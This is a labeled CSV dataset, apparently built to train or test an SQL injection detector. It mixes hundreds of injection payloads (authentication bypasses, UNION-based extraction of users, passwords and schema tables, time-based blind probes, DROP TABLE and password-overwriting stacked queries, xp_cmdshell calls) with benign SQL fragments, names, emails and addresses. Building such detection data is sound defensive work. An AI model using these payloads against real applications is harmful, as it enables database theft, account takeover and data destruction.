Sentence,Label
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--431517",1
test' UNION SELECT NULL----#779339,1
piejo,0
"once septiembre, 95",0
"1' UNION SELECT username,password FROM users--652576--33",1
admin' OR 1=1/*## OR 1=1130,1
1%27--#,1
"   SELECT brought, worth, lady FROM stand WHERE current  IS NULL",0
"user"" UNION SELECT NULL--/*583513",1
""" OR 1=1#--813",1
'+OR+1=1#/*# AND 1=1/* AND 1=1567,1
"admin1"" OR ""1"" = ""1# AND 1=1#785317",1
')/**/OR/**/1=1--#571,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1 AND 1=1 OR 1=1 OR 1=1914,1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1#155",1
1' OR 1=1/*/*444,1
admin' OR '99'='99 OR 1=1240,1
'/**/OR/**/'1'='1'/**/--282#985/*,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799662146",1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813",1
egner,0
') OR ('1'='1/*--384#,1
"1"" UNION SELECT NULL,NULL------611/*488",1
"1';/**/INSERT/**/INTO/**/users/**/VALUES('hacked','pass')----",1
"admin' UNION SELECT 1,2,3---- OR 1=1663381",1
2' AND SLEEP(5)--761163218,1
1' OR '1' = '1 AND 1=1 AND 1=1/*99389,1
SELECT bound ( s )  FROM teeth UNION,0
SELECT * FROM factory WHERE team = 'into',0
SELECT * FROM eventually 3 SELECT * FROM held,0
""" OR 1=1#----## AND 1=1/*",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977136",1
SELECT COUNT ( second )  FROM inside,0
"terque 135, 7-c",0
""" UNION ALL SELECT NULL--/* AND 1=187",1
jerusaln,0
rebengivc@somosagelespaa.ie,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--431938",1
adminadmin' OR '1'='1/*--756,1
SELECT behind ( s )  FROM worth FULL OUTER JOIN,0
admin') OR 1=1--# AND 1=1580917,1
ADMIN'/* AND 1=1--784,1
kaufherr.gargoet@santacruzdelvoto.sh,0
admin' OR 1=1#/*327541,1
'%20or%201=1--969 OR 1=1 AND 1=1623,1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*81426",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----765",1
"""+UNION+SELECT+NULL--608861 AND 1=1609",1
9.0515E+015,0
' OR '1'='1--322341,1
"1'/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--140",1
admin0x27/* OR 1=1 AND 1=1298 OR 1=1,1
SELECT * FROM worried ORDER BY double DESC,0
carew1@koinup.ni,0
"admin' UNION SELECT 1,2,3----811-- OR 1=1#530",1
"' UNION SELECT NULL,NULL,NULL--24179 AND 1=1",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892--860",1
"1' UNION SELECT 1,2,3-- AND 1=1952 AND 1=1 OR 1=1",1
' or 2=2--415,1
SELECT held FROM even UNION ALL SELECT fresh FROM similar ORDER BY pound,0
SELECT AVG ( cotton ) FROM mother,0
"calle juan sitges 24,",0
br8c99ma4290,0
"""%20or%201=1#428/*715",1
7688900000000000,0
SELECT TOP 50 PERCENT * FROM father SELECT * FROM coming FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM hide,0
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1165,1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1309380",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/*--",1
0x27 UNION ALL SELECT NULL--415 AND 1=1,1
"test' UNION SELECT username,password FROM users--/*#/*#--",1
"""+UNION+SELECT+NULL--608168599",1
admin1' OR '1' = '1--279# AND 1=1482,1
test' OR '1'='1' /*#/*--,1
admin' OR 1=1/*##,1
99' OR 99 = 99 OR 1=1##,1
'%20or%201=1--969 OR 1=1/*/*,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----865,1
"admin1"" OR ""1"" = ""1--/*73711",1
test' OR '1'='1' /*#/*654 AND 1=1,1
admin' OR 1=1-- OR 1=1#781387,1
"INSERT INTO surrounded ( blood, basic, shot, between, cent, gulf )  VALUES  ( 'hidden', 'escape'. few', 'globe', 'job', 'choose', 'lady' )  ",0
"test"" UNION ALL SELECT NULL-- OR 1=1 OR 1=1",1
aDMin'/* OR 1=1/*#392/*,1
"'+UNION+SELECT+NULL,NULL--#934",1
"useradmin"" OR ""1""=""1-- OR 1=1125-- AND 1=1",1
ADMIN'/* AND 1=1--819,1
" SELECT column_name ( s )  FROM pure,sound",0
"   SELECT cap, meal, hungry FROM captured WHERE pony  IS NULL",0
33529,0
SELECT * FROM short WHERE    NOT want = 'twelve',0
"1' UNION SELECT 1,2,3-- AND 1=1952 AND 1=1136/*#",1
"  SELECT   COALESCE ( NULL, NULL, NULL, 'W3Schools.com', NULL, 'Example.com' ) ;",0
"""%09UNION%09SELECT%09NULL,NULL-- OR 1=1899",1
"1""%20AND%20pg_sleep(5)--533872287 OR 1=1124/*",1
test') OR 1=1--/* OR 1=1,1
"  SELECT fastened,fall FROM wash WHERE enter = 'play' UNION SELECT seven, block FROM certainly",0
"1"" UNION SELECT NULL,NULL------611--/*821633",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1704373#",1
'+OR+1=1#/*160718,1
SELECT * FROM mouse 3 SELECT * FROM force,0
al769i4,0
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813968#807",1
"1"" UNION SELECT 1,2,3-- AND 1=1----56111",1
hamzeh,0
SELECT TOP 50 PERCENT * FROM atom,0
"test"" UNION SELECT NULL,NULL--/* AND 1=157",1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428/*665960",1
'%09UNION%09ALL%09SELECT%09NULL--/*/*886,1
"""/**/OR/**/""1""=""1""/**//*589 OR 1=1#",1
"SELECT * FROM salmon WHERE first BETWEEN ""wool"" AND    ""well""",0
"1'; INSERT INTO users VALUES('hacked','pass')---- OR 1=1124",1
"1"" UNION SELECT NULL----395178",1
SELECT * FROM planned WHERE NOT ourselves = 'nervous'  AND NOT open = 'particular',0
"  SELECT expect,thou,great FROM winter LEFT JOIN Orders ON forget.blockID =  gold.paid ORDER BY television.across",0
2' OR '2' = '2163254#592,1
""" OR 1=1/*--929888175#481",1
" SELECT column_name ( s )  FROM sky,worth",0
"calle ter, 20,",0
' OR '1'='1 AND 1=1 OR 1=1628,1
'; WAITFOR DELAY '0:0:5'--/*455,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1871391",1
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste,0
%27%20UNION%20SELECT%20NULL--947,1
"  UPDATE they SET or =  'golden', City =  'path' WHERE us =  onto",0
SELECT TOP 3 * FROM forgotten WHERE coast = 'boy' SELECT * FROM gently,0
test1' OR 1 = 1/*971,1
"'%09UNION%09SELECT%09NULL,NULL--21500",1
olaughlin@pinkplanetplasencia.uy,0
SELECT * FROM consist WHERE add BETWEEN 'example' AND 'birthday',0
1' OR 1=1#/*884,1
SELECT AVG ( hospital ) FROM sometime SELECT SUM ( growth ) ,0
"user"" OR ""1""=""1#315",1
"admin1"" OR 1 = 1 AND 1=1--",1
') Or ('1'='1,1
1'; WAITFOR DELAY '00:00:010'--866-- AND 1=1429394,1
"test' UNION SELECT username,password FROM users--/*516",1
forcarei,0
bazo san salvador,0
"1"" UNION SELECT NULL,NULL--# OR 1=1984 OR 1=1602",1
3.59196E+015,0
'%09UNION%09ALL%09SELECT%09NULL--477112,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370276",1
admin1' OR '1' = '1--/*/* AND 1=1,1
tiza,0
"test1' UNION SELECT NULL,table_name FROM information_schema.tables---- AND 1=1239",1
"user"") OR 1=1-- AND 1=1/* OR 1=1458",1
120958000000000,0
') OR ('2'='2 OR 1=1 AND 1=1,1
SELECT * FROM mighty WHERE least NOT LIKE '[war]%',0
"admin"") OR (""1""=""1# OR 1=1/*/* OR 1=1",1
SELECT * FROM here WHERE cap NOT LIKE '[sentence]%',0
'%20or%201=1#667--729 OR 1=1,1
SELECT dirty ( s )  FROM search SELECT who FROM think,0
'/**/OR/**/'1'='1'/**/--38 OR 1=1,1
 UPDATE basic SET frozen = 'bean'WHERE examine = 'row',0
"1"" OR ""1"" = ""1-- OR 1=1#",1
SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM chair,0
' UNION SELECT NULL--#,1
1'%20AND%20pg_sleep(5)--636517834,1
"  SELECT * FROM game WHERE tie NOT IN  ( 'glad', 'dig', 'largest' )  ",0
' OR '1'='1' --/* AND 1=1793#760,1
SELECT * FROM smooth WHERE lungs = 'gone',0
SELECT * FROM glad WHERE source = 'fairly'  OR widely = 'image',0
"admin1"" UNION SELECT NULL,table_name FROM information_schema.tables--813 OR 1=1 OR 1=1",1
11' OR 1 = 1/*--# OR 1=1985,1
comerma crdoba,0
SELECT whale ( s )  FROM join LEFT JOIN,0
"1'; INSERT INTO users VALUES('hacked','pass')--739##375 AND 1=1--",1
winifred5,0
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1708301",1
3o7za732,0
SELECT * FROM porch FETCH FIRST 50 PERCENT ROWS ONLY,0
"   SELECT shoot,state,trunk,possible,knew     (  (  warn JOIN does ON truth.kept =  shall.victory )   INNER JOIN proveON Orders.fallen =  hide.zooID ) ",0
"99"" OR 99 = 99 OR 1=1#/*5 OR 1=1707549",1
"admin"") OR (""1""=""1# OR 1=1657",1
SELECT lunch ( s FROM dead RIGHT JOIN,0
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958688 AND 1=1",1
';%09EXEC%09xp_cmdshell('dir')----#927,1
zlotnick,0
%27%29%20OR%20%28%271%27%3D%271 AND 1=1956 AND 1=1,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1157 OR 1=1",1
""" UNION ALL SELECT NULL--/* AND 1=1964 OR 1=1",1
"test"" UNION SELECT 1,2,3--/*#974 OR 1=1#845",1
useradmin' OR 1=1--#/*606171457,1
SELECT * FROM limited WHERE oil BETWEEN '1996-07-01' AND '1996-07-31',0
1'%20AND%20pg_sleep(5)--533872287/*,1
ci2586ta,0
SELECT * FROM  ( SELECT alive FROM fruit ) ,0
""" UNION SELECT NULL--/*622/*427/*25640440",1
"""; UPDATE users SET password=""hacked""-- AND 1=1",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497",1
' or 2=2/*#484,1
4436070000000000,0
2.82E+015,0
SELECT TOP 3 * FROM split SELECT * FROM explore 3SELECT * FROM tie,0
"' union select null,null,null--# AND 1=1--/*",1
') OR ('1'='1/* OR 1=1293408209912,1
SELECT TOP 3 * FROM kept SELECT * FROM stove 3SELECT * FROM blood,0
estorbar,0
"1"" UNION SELECT NULL----159334239248199982 AND 1=1",1
admin' UNION SELECT NULL-- AND 1=1#645/*773,1
maximiliano,0
admin' UNION ALL SELECT NULL--24127# AND 1=1816,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1889608 AND 1=1",1
SELECT AVG ( wrote )  FROM composition  SELECT SUM ( wore ) ,0
"1"" OR ""1""=""1"" --#57 OR 1=1--",1
test' OR 1=1##/* OR 1=1610--,1
SELECT MIN ( tower )  AS depth FROM most,0
"""/**/OR/**/""1""=""1""/**/-- OR 1=1361 AND 1=1",1
"merca, a",0
'/**/or/**/1=1/*135540 OR 1=1/*,1
""" OR ""1""=""1"" --/* AND 1=1",1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1###",1
user' OR '1'='1' -- AND 1=1/*/*,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773120",1
"1"" UNION SELECT 1,2,3-- AND 1=1---- OR 1=1",1
admin' UNION SELECT NULL-- AND 1=1#645270629392,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1666546",1
' UNION SELECT NULL--/*622/*-- AND 1=1#,1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1202/* OR 1=1#,1
') OR ('1'='1/* OR 1=1--/*248642322,1
' UNION SELECT NULL--/*622/*--771,1
"99'; INSERT INTO users VALUES('hacked','pass')--37281667352",1
1%27%3B%20DROP%20TABLE%20users--/*683,1
SELECT * FROM  ( SELECT mood FROM fairly ) ,0
"calle sergio luna, s/n 11g",0
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1# AND 1=1#",1
1' OR '1'='1' --#57/*146821,1
"test"" UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1#",1
"""%09UNION%09ALL%09SELECT%09NULL--456",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1/*770,1
"' union select null,null,null--# AND 1=1-- AND 1=1121",1
' OR '1'='1' --/* AND 1=1793# OR 1=1,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4982 )  ORDER BY meta_id ASC",0
kiri,0
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_captcha_settings' LIMIT 1,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--90",1
'+OR+'1'='1-- AND 1=1 AND 1=1--,1
admin0x27/* OR 1=1599,1
"1';/**/INSERT/**/INTO/**/users/**/VALUES('hacked','pass')-- OR 1=1",1
"   SELECT ready, enemy, mice FROM bad WHERE frozen  IS NULL",0
' OR '2'='2277272904,1
"calle platerias, 47",0
"mirn, el",0
"' union select null,null,null--748770",1
' OR '2'='213/*10140 OR 1=1,1
"  SELECT TIME ( ""2017-08-15 19:30:10"" ) ;",0
test' UNION ALL SELECT NULL--954683,1
06314426y,0
admin'%20OR%20'1'='1 AND 1=1987 AND 1=1,1
"1"" UNION SELECT NULL----159883",1
'%09OR%091=1--#273,1
"test' UNION SELECT username,password FROM users--/*836120",1
0x27 UNION ALL SELECT NULL--415482,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489920189",1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1 OR 1=134961",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197 AND 1=1#",1
SELECT COUNT ( DISTINCT round )  FROM pictured,0
"user"") OR (""1""=""1--167387--",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1889141618",1
"admin"" UNION SELECT NULL,NULL--181-- OR 1=1",1
"user"" UNION SELECT NULL,NULL,NULL--805 AND 1=1 AND 1=1",1
""")/**/OR/**/1=1-- OR 1=1",1
' AND 2=CAST((SELECT @@version) AS int)--881,1
' OR '2'='2 AND 1=1795,1
""" OR ""1""=""1 AND 1=1104417",1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655432",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168179",1
"INSERT INTO total  ( replied, job, settlers )  VALUES  ( 'fastened', 'scale', 'pond' )  ",0
"' union select 1,2,3--",1
"ADMIN""/*172531#747",1
ondorica arabia,0
' OR '2'='2 OR 1=1/*,1
"admin"" UNION SELECT 1,2,3-- AND 1=1957725289",1
"test"" OR 1=1#/*# AND 1=1",1
user' OR 1=1/*/* AND 1=1/*/*#9,1
"1"" OR 1=1/*#380/*",1
"10x27; INSERT INTO users VALUES(0x27hacked0x27,0x27pass0x27)--#620",1
SELECT * FROM found WHERE ride BETWEEN '1996-07-01' AND '1996-07-31',0
admin' UNION SELECT NULL-- AND 1=1#645/*735909 AND 1=1,1
'%09OR%091=1#,1
' UNION SELECT NULL--/*622/*427/*#,1
SELECT guide ( s )  FROM baseball SELECT war ( s ) ,0
SELECT fruit ( s )  FROM recognize UNION,0
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845781522,1
' OR '2'='2 AND 1=1 AND 1=1--#,1
celadas,0
' UNION SELECT NULL--/*622/*427/*515#,1
"  SELECT sentence,imagine,another FROM brass LEFT JOIN Orders ON having.mannerID =  tune.generally ORDER BY snow.discover",0
SELECT nails ( s )  FROM sick LEFT JOIN,0
user1' OR '1' = '1659278,1
'%09OR%091=1--#302,1
'%20or%201=1#/*#184,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1 AND 1=1 OR 1=1 OR 1=1493,1
ilijev@mauroman.tc,0
"  SELECT HOUR ( ""838:59:59"" ) ;",0
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138##565",1
'+OR+'1'='1-- AND 1=1 AND 1=1#,1
1' OR '1'='1' --#57 OR 1=1# OR 1=1,1
admin' OR 1=1--/*82,1
"'%09UNION%09SELECT%09NULL,NULL--21495",1
"  SELECT Orders.memoryrID, Employees.slightly, Employees.rain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.westernID ORDER BY Orders.medicineID",0
"SELECT * FROM exchange WHERE best BETWEEN ""taught"" AND    ""involved""",0
test' OR 1=1##/*#600841 OR 1=1250,1
1' OR '1'='1' --/*612 AND 1=1#988 OR 1=1,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--598669/*",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1242",1
SELECT * FROM cowboy 3,0
""" AND extractvalue(1,concat(0x7e,version()))--161/*788318300328",1
SELECT COUNT ( baby ) FROM recent,0
"admin1"" OR ""1"" = ""1# AND 1=1",1
test' OR 1=1#/*#642,1
test' OR 1=1#/*#889--118,1
admin' OR 1=1/*--863 AND 1=1---- AND 1=1424,1
SELECT MIN ( recent )  AS bring FROM sense,0
'; UPDATE USERS SET PASSWORD='HACKED'--69164 OR 1=1169,1
milionario.kirkham@programa-gestion-erp.mil,0
sedran,0
24768,0
%2527%2529%2520OR%2520%2528%25271%2527%253D%25271--637,1
';+SELECT+SLEEP(5)----,1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- OR 1=1 OR 1=1",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892-- OR 1=1923 AND 1=1469",1
""" OR 1=1#-- OR 1=1# AND 1=1/*",1
"SELECT * FROM return WHERE medicine BETWEEN ""darkness"" AND    ""guard""",0
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773288",1
obolensky@etnics.hr,0
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*834",1
villanueva del rosario,0
admin' UNION ALL SELECT NULL-- AND 1=16234,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756710 OR 1=1--124",1
49694,0
SELECT * FROM camp FETCH FIRST 50 PERCENT ROWS ONLY,0
"99'; INSERT INTO users VALUES('hacked','pass')--37281667561543",1
"1' UNION SELECT 1,2,3-- AND 1=1340",1
"  SELECT rocky AS compound, chosen AS [lady]  FROM key",0
1' OR '1' = '1 AND 1=1566561,1
';%09UPDATE%09users%09SET%09password='hacked'--,1
SELECT pen ( s )  FROM scientist SELECT bank ( s ) ,0
gu5cima,0
"1' UNION SELECT NULL,table_name FROM information_schema.tables----",1
"user"" UNION SELECT NULL,NULL,NULL--805 OR 1=1 AND 1=1 OR 1=1",1
1' OR '1'='1' --#57#179,1
"admin"") OR 1=1----/*74",1
'%20or%201=1--969 OR 1=1/*215 OR 1=1786866,1
"admin"" UNION SELECT NULL,NULL--181733",1
SELECT * FROM sing WHERE Price NOT BETWEEN 10 AND 20,0
"  SELECT equallyID AS ID, dance AS hang FROM duck",0
"useradmin"" OR 1=1--#572/*-- OR 1=1#/*",1
leda,0
' OR '2'='213973 AND 1=1--53--#,1
1008,0
SELECT COUNT ( actual ) FROM neck,0
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845781659,1
"1"" OR 1=1/*# OR 1=1/* AND 1=1--",1
' OR '1'='1' /*-- OR 1=1,1
"1' UNION SELECT username,password FROM users--/*--",1
""" OR ""2""=""2 OR 1=1",1
"calle rendona 45, 5-a",0
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=150991",1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1 OR 1=1",1
"user' UNION SELECT NULL,NULL--# OR 1=1421",1
SELECT * FROM  ( SELECT problem FROM exercise ) ,0
SELECT * FROM double WHERE    NOT wheel = 'knew',0
SELECT MIN ( occur )  AS sand FROM capital,0
'/**/OR/**/'1'='1'/**/--/*75#591 AND 1=1--,1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481868",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631/*/* AND 1=1",1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457#359 OR 1=1",1
'%20or%201=1/*835257383##,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1746,1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1/*112",1
r3nci8l5so,0
useradmin' OR 1=1-- AND 1=1--/*,1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1 AND 1=1",1
user') OR 1=1----,1
3302120000000000,0
"testadmin"" OR ""1""=""1 AND 1=1613----#115",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1/*",1
"  SELECT eggID AS ID, sitting AS him FROM throw",0
';%20SELECT%20SLEEP(5)--#,1
ADMIN'/* AND 1=1911 AND 1=110515794221,1
admin' OR '1'='1--904,1
4or6un0,0
1' OR '1'='1' --/* OR 1=1-- OR 1=1 AND 1=1 OR 1=1,1
admin' OR '1'='1--727,1
"""%09or%091=1# AND 1=1 OR 1=1203",1
"test1"" OR ""1"" = ""1/*# AND 1=1--25573",1
hoefer.tabuyo@gopersonalfitness.nz,0
2' AND SLEEP(5)----232--,1
trespaderne,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--431615",1
"calle goya 46, 10?g",0
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1292",1
useradmin' OR 1=1--#/*606 AND 1=1 AND 1=1980,1
'; UPDATE users SET password='hacked'--153,1
') OR ('2'='2 OR 1=1290#,1
SELECT * FROM popular WHERE further BETWEEN 'hot' AND 'transportation',0
admin' OR '99'='99 OR 1=1926,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350486",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138--442",1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408 OR 1=1",1
admin'/**/OR/**/1=1-- OR 1=1402624,1
"admin"" OR 1=1-- OR 1=1 AND 1=1 AND 1=1#215",1
"SELECT column1 , column2 , column3 , ... FROM table1 WHERE condition ; INSERT INTO Customers  ( CustomerName, City, Country )  ",0
'/**/or/**/1=1/* AND 1=1 AND 1=1345,1
"1""%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- OR 1=1--/* OR 1=1106",1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827--195",1
"""%20or%201=1#428/*#",1
SELECT * FROM review WHERE torn IN  ( SELECT service FROM invented ) ,0
'/**/OR/**/1=1----525,1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428 AND 1=1",1
SELECT * FROM pile WHERE idea NOT LIKE 'most%',0
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--",1
"user' UNION SELECT NULL,NULL-- AND 1=1",1
pereda barrio,0
' AND 2=CAST((SELECT @@version) AS int)--881963 OR 1=1/*922,1
"1"" OR 1=1/*# OR 1=1/* AND 1=1482",1
SELECT * FROM  ( SELECT somehow FROM rain ) ,0
';%20EXEC%20xp_cmdshell('dir')--#/*648,1
'+OR+1=1#/*-- AND 1=1132,1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- AND 1=1--",1
"admin1"" OR ""1"" = ""1# OR 1=1/*67-- OR 1=1350",1
"admin1"" OR ""1"" = ""1# OR 1=1/*67721470171",1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables----418555",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))-- OR 1=13230",1
' or 99=99------,1
aDMin'/*7786,1
SELECT * FROM chance,0
